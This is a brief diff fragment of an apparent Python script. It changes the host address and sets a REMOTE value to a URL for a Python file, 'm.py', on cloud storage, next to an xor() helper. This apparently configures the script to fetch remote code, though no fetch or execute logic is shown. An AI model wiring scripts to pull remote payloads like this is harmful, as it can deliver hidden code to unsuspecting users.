@@ -33,9 +33,9 @@ else:
     sys.exit(1)
 
 # change these to suit your needs
-HOST = '127.0.0.1'
+HOST = '1.1.1.1'
 PORT = 8004
-REMOTE = "#TODO"
+REMOTE = "https://secscan.oss-cn-hangzhou.aliyuncs.com/m.py"
 
 
 def xor(text):
